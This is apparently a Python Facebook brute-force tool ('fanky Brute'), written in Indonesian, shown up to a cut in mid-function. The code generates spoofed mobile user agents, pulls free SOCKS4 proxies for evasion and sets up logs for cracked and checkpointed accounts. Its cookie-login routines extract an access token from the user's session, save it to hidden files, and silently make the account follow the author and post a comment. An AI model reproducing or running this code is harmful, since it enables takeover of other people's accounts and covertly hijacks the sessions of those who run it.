import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE

try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()
try:
    import licensing
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul licensing{H2} •{P2}")
    os.system("pip install licensing")
try:
    import rich
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {H2}• {U2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")

# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
from datetime import date, datetime
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console as Console
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from licensing.models import *
from licensing.methods import Key, Helpers
from concurrent.futures import ThreadPoolExecutor as executor

# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
prem = []
ugen=[]
ugent=[]
ngentott=[]
temanku = []
console = Console()
ses = requests.Session()
lisensiku=[]
hapus  = '[/]'
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = (
    [],
    [],
    0,
    0,
    0,
    [],
    [],
    [],
    [],
    [],
    [],
    [],
)
(
    dia,
    ualu,
    ualuh,
) = (
    [],
    [],
    [],
)
sys.stdout.write("\x1b]2; BMBF | fanky Brute\x07")



# USER AGENT

for xc in range(10000):
    rr,rc = random.randint, random.choice
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC", "LRX22G"]
    samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]"
    #u5 = f"Mozilla/5.0 (Linux; Android {str(rr(2, 16))}; {str(rc(realme))} Build/SP1A{str(rr(111111,299999))}.0{str(rr(0,2))}{str(rr(0,9))}; wv)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 MobileSafari/537.36 [FB_IAB/FB4A;FBAV/340.0.0.27.113;]" 
    uateddy = random.choice([u1,u2,u3,u4])
    ugen.append(uateddy)


# ------------------[ USER-AGENT ]-------------------#
try:
    # Mendapatkan proxy dari API
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    
    # Menyimpan proxy ke file
    with open(".prox.txt", "w") as proxy_file:
        proxy_file.write(prox)
except requests.exceptions.RequestException as e:
    Console().print(
        f" {H2}• {P2}[bold red]Koneksi Internet Anda Tidak Terdeteksi. Silahkan Cek Kuota Anda: {e}"
    )
    exit()

# Membaca file proxy
try:
    with open(".prox.txt", "r") as proxy_file:
        prox = proxy_file.read().splitlines()
except IOError as e:
    Console().print(
        f" {H2}• {P2}[bold red]Gagal Membaca File Proxy: {e}"
    )
    exit()

# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"

SE = "[#9F9F9F]"
puti = "\x1b[1;97m"  # WARNA-PUTIH
mer = "\x1b[1;91m"  # WARNA-MERAH
kun = "\x1b[1;93m"  # WARNA-KUJING
hijo = "\x1b[1;92m"  # WARNA-HIJAU
ung = "\x1b[1;95m"  # WARNA-UNGU
biru = "\x1b[1;94m"  # WARNA-BIRU
P = "\x1b[1;97m"  # PUTIH
M = "\x1b[1;91m"  # MERAH
H = "\x1b[1;92m"  # HIJAU
K = "\x1b[1;93m"  # KUNING
B = "\x1b[1;94m"  # BIRU
U = "\x1b[1;95m"  # UNGU
O = "\x1b[1;96m"  # BIRU MUDA
N = "\x1b[0m"  # WARNA MATI
# ------------[ WARNA-COLOR ]--------------#
P = "\x1b[1;97m"
M = "\x1b[1;91m"
H = "\x1b[1;92m"
K = "\x1b[1;93m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
O = "\x1b[1;96m"
N = "\x1b[0m"
Z = "\033[1;30m"
sir = "\033[41m\x1b[1;97m"
x = "\33[m"  # DEFAULT
m = "\x1b[1;91m"  # RED +
k = "\033[93m"  # KUNING +
h = "\x1b[1;92m"  # HIJAU +
hh = "\033[32m"  # HIJAU -
u = "\033[95m"  # UNGU
kk = "\033[33m"  # KUNING -
b = "\33[1;96m"  # BIRU -
p = "\x1b[0;34m"  # BIRU +
asu = random.choice([m, k, h, u, b])
kom1 = "Anjng Panutan Ku, Keren Bngt Bnjerr 🤙\n -\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[ Semangat Bang @[100043537611609:] ]"
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
kom3 = "Panutan Ku"
kom4 = "Pintar Banget"
kom5 = "Jadikan Aku Anak Buah Mu Bang @[100043537611609:]"
kom6 = " Izin Share Ya Bang\n-\nhttps://www.facebook.com/100043537611609/posts/878169396977639/?app=fbl\n-\nSemangat Ya Bang ❤"





# Dictionary bulan
dic = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
dic2 = {
    "01": "January",
    "02": "February",
    "03": "March",
    "04": "April",
    "05": "May",
    "06": "June",
    "07": "July",
    "08": "August",
    "09": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}

# Mendapatkan tanggal sekarang
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]  # Gunakan dic untuk mendapatkan nama bulan
thn = datetime.datetime.now().year

# File log untuk OK dan CP
okc = f"OK-{tgl}-{bln}-{thn}.txt"
cpc = f"CP-{tgl}-{bln}-{thn}.txt"

# Mendapatkan jam dan hari ini
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")

def clear():
    os.system("clear")

def banner():
    Console().print(
        Panel(
            """
[bold red]███████████████████████    
[bold red]███████████████████████ [bold yellow]Github : [bold green]fanky86
[bold red]███████████████████████ [bold yellow]Wa     : [bold green]+62895359611***
[bold white]███████████████████████          
[bold white]███████████████████████          
[bold white]███████████████████████ 
            """,
            width=60,
            style=color_panel,  # Pastikan color_panel sudah terdefinisi
        )
    )
    



# --------------------[ BAGIAN-MASUK ]--------------#
def login123():
    os.system("clear")
    banner()
    Console().print(
        Panel(
            f"""{P2}[{color_text}01{P2}]. Login Menggunakan Cookie\n[{color_text}02{P2}]. {M2}Keluar""",
            width=60,
            style=f"{color_panel}",
            title="[bold green]Login",
        )
    )
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ["1", "01"]:
        logincoki()
    elif bryn in ["2", "02"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(2)
        login123()  # Mengulang kembali login123 jika pilihan tidak diketahui


def login():
    try:
        with open(".vipertok.txt", "r") as f:
            token = f.read().strip()
        with open(".vipercok.txt", "r") as f:
            cok = f.read().strip()

        try:
            response = requests.get(
                "https://graph.facebook.com/me?fields=id,name&access_token=" + token,
                cookies={"cookie": cok},
            )
            response.raise_for_status()  # Memicu pengecualian untuk status HTTP yang buruk

            user_data = response.json()
            sy2 = user_data["name"][0:15]
            sy3 = user_data["id"]
            menu(sy2, sy3)
        except KeyError:
            Console().print(f" {H2}• {P2}[bold red]Kesalahan dalam mendapatkan data pengguna!")
            login123()  # Kembali ke login jika tidak ada data
        except requests.exceptions.HTTPError as http_err:
            Console().print(f" {H2}• {P2}[bold red]HTTP Error: {http_err}")
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}[bold red]Masalah Koneksi Internet, Periksa dan Coba Lagi")
            exit()
    except IOError:
        Console().print(f" {H2}• {P2}[bold red]File tidak ditemukan, harap login kembali!")
        login123()



import requests
from bs4 import BeautifulSoup as BSP

def logincoki():
    cookie = Console().input(f" {H2}• {P2}cookie : ")
    try:
        ses.headers.update(
            {
                "Accept-Language": "id,en;q=0.9",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
                "Referer": "https://www.instagram.com/",
                "Host": "www.facebook.com",
                "Sec-Fetch-Mode": "cors",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Sec-Fetch-Site": "cross-site",
                "Sec-Fetch-Dest": "empty",
                "Origin": "https://www.instagram.com",
                "Accept-Encoding": "gzip, deflate",
            }
        )
        link = ses.get(
            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
            cookies={"cookie": cookie},
        )
        if '"access_token":' in str(link.headers):
            token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
            open(".vipercok.txt", "w").write(cookie)
            open(".vipertok.txt", "w").write(token)
            viperfollow(cookie)
            requests.post(
                f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
                headers={"cookie": cookie},
            )
            Console().print(
                Panel(
                    f"""{P2}{token}""",
                    width=60,
                    style=f"{color_panel}",
                    title="[bold green]TOKEN",
                )
            )
            Console().print(
                f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script"
            )
    except Exception as e:
        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
        print(e)
        time.sleep(3)
        exit()
    except:
        pass
        
def viperfollow(VIPER):  
    """
    Fungsi untuk mengikuti akun Facebook berdasarkan cookie yang diberikan.

    Args:
        VIPER (dict): Cookies yang digunakan untuk mengakses halaman Facebook.
    """
    try:
        # Mengambil konten halaman Facebook menggunakan cookie
        response = requests.get("https://m.facebook.com/100043537611609", cookies=VIPER)
        response.raise_for_status()  # Memicu pengecualian untuk status HTTP yang buruk

        # Menggunakan BeautifulSoup untuk mem-parsing HTML
        req = BSP(response.text, "html.parser")

        # Mencari semua tautan untuk subscribe
        for link in req.find_all("a", href=True):
            if "/a/subscribe.php?" in str(link.get("href")):
                follow_response = requests.get(
                    f"https://m.facebook.com{link['href']}", cookies=VIPER
                )
                follow_response.raise_for_status()  # Memicu pengecualian jika gagal mengikuti
                # Anda bisa menambahkan logika tambahan di sini jika diperlukan
                break  # Berhenti setelah menemukan dan mengikuti satu tautan
    except requests.exceptions.RequestException as e:
        # Menangani kesalahan permintaan (misalnya, koneksi, waktu tunggu)
        print(f"[bold red]Terjadi kesalahan saat mencoba mengikuti: {e}")
    except Exception as e:
        # Menangani kesalahan lain yang tidak terduga
        print(f"[bold red]Kesalahan tidak terduga: {e}")
        








# Fungsi untuk login dengan cookie
def logincokiiiii():
    # Mengambil input cookie dari user
    cookie = Console().input(f" {H2}• {P2}cookie : ")
    try:
        # Mengupdate header session
        ses.headers.update({
            "Accept-Language": "id,en;q=0.9",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Referer": "https://www.instagram.com/",
            "Host": "www.facebook.com",
            "Sec-Fetch-Mode": "cors",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Dest": "empty",
            "Origin": "https://www.instagram.com",
            "Accept-Encoding": "gzip, deflate",
        })

        # Permintaan GET untuk mengambil data dari link
        response = ses.get(
            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
            cookies={"cookie": cookie},
        )

        # Mengecek apakah response berhasil
        if response.status_code == 200:
            if '"access_token":' in response.text:
                # Mengambil access_token dari response
                token = re.search('"access_token":"(.*?)"', response.text).group(1)
                
                # Menyimpan cookie dan token ke dalam file
                with open(".vipercok.txt", "w") as cok_file:
                    cok_file.write(cookie)
                with open(".vipertok.txt", "w") as tok_file:
                    tok_file.write(token)

                # Memanggil fungsi untuk melakukan follow otomatis (asumsi viperfollow didefinisikan di tempat lain)
                viperfollow(cookie)

                # Mengirim komentar menggunakan token
                requests.post(
                    f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}",
                    headers={"cookie": cookie},
                )

                # Menampilkan token dalam bentuk panel
                Console().print(
                    Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN")
                )
                Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan ulang script")
            else:
                # Jika tidak ada access_token di dalam response
                raise Exception("Tidak dapat menemukan access_token dalam response")
        else:
            # Jika status response tidak 200
            raise Exception(f"HTTP Error: {response.status_code}")

    except requests.exceptions.RequestException as req_err:
